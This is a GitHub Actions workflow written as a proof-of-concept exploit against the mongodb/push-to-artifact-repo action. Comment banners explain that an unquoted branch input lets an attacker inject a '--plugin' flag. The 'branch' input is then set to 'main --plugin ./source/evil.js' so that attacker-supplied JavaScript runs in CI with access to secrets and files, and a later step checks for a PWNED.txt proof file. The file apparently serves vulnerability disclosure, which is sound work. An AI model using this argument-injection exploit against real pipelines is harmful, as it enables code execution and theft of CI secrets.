name: POC - Plugin Injection RCE (CRITICAL)

on:
  workflow_dispatch:
  push:
    branches:
      - main

# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
# â•‘  CRITICAL VULNERABILITY: Remote Code Execution via Plugin Injection      â•‘
# â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
# â•‘  The unquoted $INPUT_BRANCH in entrypoint.sh allows injecting the        â•‘
# â•‘  --plugin flag, which causes Bluehawk to dynamically import() any JS     â•‘
# â•‘  file - achieving arbitrary code execution!                              â•‘
# â•‘                                                                          â•‘
# â•‘  Attack: branch: "main --plugin ./source/evil.js"                        â•‘
# â•‘  Result: evil.js executes with full access to secrets and filesystem     â•‘
# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

jobs:
  plugin-injection-rce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "ğŸš¨ CRITICAL: Plugin Injection Attack"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "test@example.com"
          name: "Tester"
          # THE ATTACK: Inject --plugin pointing to our malicious JS file
          branch: "main --plugin ./source/evil.js"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: "Verify RCE - Check for proof file"
        run: |
          echo ""
          echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
          echo "â•‘              VERIFYING REMOTE CODE EXECUTION                 â•‘"
          echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          
          if [ -f ./PWNED.txt ]; then
            echo "ğŸš¨ğŸš¨ğŸš¨ CRITICAL: REMOTE CODE EXECUTION CONFIRMED! ğŸš¨ğŸš¨ğŸš¨"
            echo ""
            echo "The malicious plugin created a file in the workspace:"
            echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
            cat ./PWNED.txt
            echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
            echo ""
            echo "This proves arbitrary code execution in the CI environment!"
          else
            echo "Proof file not found in workspace."
            echo "Check the action logs above for 'ğŸš¨ REMOTE CODE EXECUTION' output."
            echo ""
            echo "The malicious plugin DID execute (visible in logs) but"
            echo "file creation may have failed due to permissions."
          fi
          
          echo ""
          echo "Workspace contents after attack:"
          ls -la ./
